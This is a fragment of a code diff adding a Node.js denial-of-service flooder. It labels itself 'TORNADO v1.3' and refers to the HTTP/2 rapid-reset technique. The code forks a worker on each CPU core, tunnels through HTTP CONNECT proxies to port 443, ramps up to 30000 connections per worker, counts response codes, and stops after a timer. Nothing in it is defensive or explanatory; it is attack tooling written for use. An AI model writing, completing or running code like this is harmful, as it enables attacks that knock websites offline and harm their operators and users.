+        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
+    }).once('error', () => { }).once('close', () => {
+        if (tlsSocket) {
+            tlsSocket.end(() => { tlsSocket.destroy(); go() })
+        }
+    })
+}
+
+if (cluster.isMaster) {
+
+    const workers = {}
+
+    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
+    console.log(`Attack Start / @rapidreset love you <3 / TORNADO v1.3`);
+
+    cluster.on('exit', (worker) => {
+        cluster.fork({ core: worker.id % os.cpus().length });
+    });
+
+    cluster.on('message', (worker, message) => {
+        workers[worker.id] = [worker, message]
+    })
+    if (debugMode) {
+        setInterval(() => {
+
+            let statuses = {}
+            for (let w in workers) {
+                if (workers[w][0].state == 'online') {
+                    for (let st of workers[w][1]) {
+                        for (let code in st) {
+                            if (statuses[code] == null)
+                                statuses[code] = 0
+
+                            statuses[code] += st[code]
+                        }
+                    }
+                }
+            }
+            console.clear()
+            console.log(new Date().toLocaleString('us'), statuses)
+        }, 1000)
+    }
+
+    setTimeout(() => process.exit(1), time * 1000);
+
+} else {
+    let conns = 0
+    go_rapidreset();
+    let i = setInterval(() => {
+        if (conns < 30000) {
+            conns++
+
+        } else {
+            clearInterval(i)
+            return
+        }
+        go()
+    }, delay);
+
+
+    if (debugMode) {
+        setInterval(() => {
+            if (statusesQ.length >= 4)
+                statusesQ.shift()
+
+            statusesQ.push(statuses)
+            statuses = {}
+            process.send(statusesQ)
+        }, 250)
+    }
+    
+    setTimeout(() => process.exit(1), time * 1000);
+}
